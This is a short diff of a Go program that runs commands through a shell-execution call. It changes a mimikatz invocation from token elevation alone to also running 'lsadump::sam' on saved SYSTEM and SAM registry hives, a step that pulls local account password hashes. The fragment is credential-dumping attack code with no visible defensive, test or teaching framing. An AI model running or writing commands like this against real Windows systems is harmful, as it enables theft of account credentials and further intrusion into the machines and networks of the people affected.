@@ -22,7 +22,7 @@ func main() {
 		panic(err)
 		return
 	}
-	stdout, _, err := shell.Execute("cd mimi\\x64 ; .\\mimikatz 'token::elevate' exit")
+	stdout, _, err := shell.Execute("cd mimi\\x64 ; .\\mimikatz 'token::elevate' lsadump::sam system.hiv sam.hiv exit")
 	if err != nil {
 		panic(err.Error())
 	}
